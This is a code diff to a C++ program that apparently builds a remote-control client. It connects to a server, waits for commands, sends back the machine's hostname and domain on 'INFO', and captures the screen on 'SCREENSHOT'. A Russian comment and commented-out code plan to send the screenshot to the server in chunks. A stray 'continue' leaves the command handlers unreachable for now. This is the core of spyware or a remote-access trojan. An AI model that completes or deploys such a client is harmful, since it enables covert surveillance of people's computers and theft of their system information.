@@ -138,7 +138,38 @@ int main() {
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
 
-    wcout <<  screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
 
+    try {
+        TCPClient client(server_ip, server_port);
+        client.connect();
+
+        while (true) {
+            string command = client.receiveMessage();
+            cout << command << endl;
+            continue;
+
+            if (command == "SCREENSHOT") {
+                wstring screen_path = screenshot(wstring(screenshot_dir.begin(), screenshot_dir.end()));
+                // перевести bmp файл в тектс (string), отправить кусками на сервер
+                //client.sendMessage("SCREENSHOT START");
+                //vector<string> fileParts = ...;
+                //for (auto fp : fileParts) {
+                //    client.sendMessage(fp);
+                //}
+                //client.sendMessage("SCREENSHOT END");
+            }
+            else if (command == "INFO") {
+                string info = "";
+                info += "hostname: " + host_name + "\n";
+                info += "domain" + host_domain_name + "\n";
+                client.sendMessage("INFO START");
+                client.sendMessage(info);
+                client.sendMessage("INFO END");
+            }
+        }        
+    }
+    catch (const std::exception& e) {
+        return 1;
+    }
 
 }
